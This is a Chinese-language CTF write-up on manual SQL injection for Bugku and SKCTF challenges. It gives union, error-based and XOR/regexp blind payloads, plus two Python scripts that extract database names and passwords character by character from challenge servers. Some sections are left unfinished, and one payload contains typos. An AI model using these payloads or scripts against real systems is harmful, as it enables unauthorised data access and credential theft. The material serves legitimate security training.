# SQL 注入
sql注入题都是sqlmap一把梭（一直咕咕咕，太羞耻了，终于要学一下手工注入了
### 普通手工简单注入大致流程
1. 判断注入点，fuzz过滤
2. 判断字段数
3. 获取基本信息（数据库名称，表名，字段名）
#### 0x01 bugku-成绩单
发现`1'#`正常返回，啥也没过滤，直接爆字段数，数据库名，表名，字段名
```
1' order by 4#		//获取字段数
5' union select database(),user(),version(),version()#		//获取数据库名称 skctf_flag
5' union select table_name,table_name,table_name,table_name from information_schema.tables where table_schema='skctf_flag'#		//获取表名	fl4g
5' union select column_name,column_name,column_name,column_name from information_schema.columns where table_name='fl4g'#	//获取字段名  skctf_flag
5' union select skctf_flag,skctf_flag,skctf_flag,skctf_flag from fl4g#		//获取内容
```
得到flag
#### 0x02 这是一个神奇的神奇的登录框
用`1"`发现有mysql报错，刚刚好看了利用报错注入（用普通注入也可以的
1. 使用updatexml报错注入

```
1" and updatexml(1,concat(0x7e,database()),0)#		//数据库名称：bugkusql1
1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),0)#		//表名：flag1
1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='flag1' limit 0,1)),0)#		//字段名：flag1
1" and updatexml(1,concat(0x7e,(select flag1 from flag1 )),0)#		//ed6b28e684817d9efcaf802979e57ae
```
//使用extractvalue()报错
poload:`1" and extractvalue(0,concat(0x7e,version()))#`
//使用floor()报错
pyload:`1" and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#`
使用floor()报错注意最后会多出来一个`1`
### 盲注
##### 常见盲注注入方式
###### 异或(XOR)注入
payload:`admin'^(ascii(mid(version()from(1)))>'1')^'1'='1'#`
前面和后面语句都固定为真，只有中间不确定，整个payload的结果都由中间的结果决定
```
1^0^1 --> 0
1^1^1 --> 1
```
不需要`and or (空格) ,` 
这里如果=被过滤还可以使用`<>`
`如果过滤了注释符和%`那就把最后一个单引号去掉`^'1'='1`
###### regexp注入
payload
###### order by盲注
payload

#### 0x03  login3(SKCTF)
bp抓包，使用爆破模块fuzz一下过滤
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190512144742573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI3ODI5,size_16,color_FFFFFF,t_70)
发现`^,<,>`没被过滤，使用第一个异或盲注

```python
import requests
url = 'http://123.206.31.85:49167/index.php'
str1 = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/=()"
req = requests.Session()
def databases():
    database = ""
    for j in range(40):
        for i in str1:
            post = {
                "username":"admin'^(ascii(mid(database()from({})))<>{})^('1'<'2')#".format(str(j),ord(i)),
                "password":"123"
            }
            # print(post)
            text = req.post(url,data=post).content.decode('utf-8')
            if "username does not exist!" in text:
                database+=str(i)
                print(database)
                break
            #print(text)
    print(database)
def password():
    passwd = ""
    for j in range(40):
        for i in str1:
            post = {
                "username": "admin'^(ascii(mid((password)from({})))<>{})^('1'<'2')#".format(str(j), ord(i)),
                "password": "123"
            }
            # print(post)
            text = req.post(url, data=post).content.decode('utf-8')
            if "username does not exist!" in text:
                passwd += str(i)
                print(passwd)
                break
            # print(text)
    print(passwd)
password()
```
在fuzz时发现infomation被过滤不能得到表名和字段名
通过`admin'^(select(1)from(admin))^1#`这个payload来撞表名
猜字段用`admin'^(select(count(password))from(admin))^1#`来撞表名

得到admin的密码的md5()
#### 0x04 sql注入2（bugku）
与上一题类似，比上一题多过滤了`#`
所以payload改为`admin'^(ascii(mid(database()from({})))<>{})^'1'='1`

```python
import requests
url = 'http://123.206.87.240:8007/web2/login.php'
str1 = ".1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/=()"
req = requests.Session()
def databases():
    database = ""
    for j in range(40):
        for i in str1:
            post = {
                "uname":"admin'^(ascii(mid(database()from({})))<>{})^'1'='1".format(str(j),ord(i)),
                "passwd":"123"
            }
            #print(post)
            text = req.post(url,data=post).content.decode('utf-8')
            #print(text)
            if "username error!!@_@" in text:
                database+=str(i)
                print(database)
                break
            #print(text)
    print(database)
def password():
    passwd = ""
    for j in range(40):
        for i in str1:
            post = {
                "uname": "admin'^(ascii(mid((passwd)from({})))<>{})^'1'='1".format(str(j), ord(i)),
                "passwd": "123"
            }
            # print(post)
            text = req.post(url, data=post).content.decode('utf-8')
            if "username error!!@_@" in text:
                passwd += str(i)
                print(passwd)
                break
            # print(text)
    print(passwd)
```
password
```mysql
0' or (select database()regexp'{}{}$') or '1'='

0' or (select table_name from infomation.scheam.table where table.scheam='pikachu')regexp'a$'

0' or (select (select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1) regexp 'r$') 		//表名

0' or (select (select group_concat(column_name) from information_schema.columns where table_name='fiag' limit 1) regexp 'd$') or '1'='  	//字段名

0' or (select (select group_concat(fl$4g) from fiag limit 1) regexp 't$') or '1'='
```
得到`admin`的密码，打开输入`ls`